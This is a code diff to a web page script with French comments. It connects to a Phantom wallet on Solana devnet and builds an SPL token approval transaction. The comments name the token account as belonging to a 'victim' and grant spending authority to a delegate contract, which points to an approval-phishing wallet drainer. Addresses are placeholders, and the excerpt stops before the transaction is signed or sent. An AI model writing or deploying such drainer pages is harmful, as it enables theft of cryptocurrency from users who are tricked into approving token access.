@@ -12,8 +12,8 @@
     <script>
         async function approveToken() {
             try {
-                // Connexion au réseau devnet
-                const connection = new solanaWeb3.Connection('https://api.devnet.solana.com', 'confirmed');
+                // Connexion au réseau devnet (plus besoin de préfixe solanaWeb3)
+                const connection = new Connection('https://api.devnet.solana.com', 'confirmed');
 
                 // Vérifier si Phantom est disponible
                 if (!window.solana || !window.solana.isPhantom) {
@@ -27,18 +27,18 @@
                 document.getElementById('status').innerText = `Statut : Connecté à ${walletPublicKey.toString()}`;
 
                 // Adresse du token SPL (remplace par ton token)
-                const tokenMint = new solanaWeb3.PublicKey('AdresseDuTokenMint');
+                const tokenMint = new PublicKey('AdresseDuTokenMint');
 
                 // Adresse du compte SPL de la victime (remplace ou crée-le)
-                const victimTokenAccount = new solanaWeb3.PublicKey('AdresseDuCompteTokenVictime');
+                const victimTokenAccount = new PublicKey('AdresseDuCompteTokenVictime');
 
                 // Adresse du contrat approuvé (simulé, utilise une adresse aléatoire ou réelle)
-                const approvedContract = new solanaWeb3.PublicKey('AdresseDuContratApprouve');
+                const approvedContract = new PublicKey('AdresseDuContratApprouve');
 
                 // Créer la transaction d’approbation
-                const transaction = new solanaWeb3.Transaction().add(
-                    solanaWeb3.Token.createApproveInstruction(
-                        solanaWeb3.TOKEN_PROGRAM_ID,
+                const transaction = new Transaction().add(
+                    Token.createApproveInstruction(
+                        TOKEN_PROGRAM_ID,
                         victimTokenAccount,      // Compte SPL à approuver
                         approvedContract,        // Contrat qui recevra l’autorisation
                         walletPublicKey,         // Propriétaire (Wallet A)
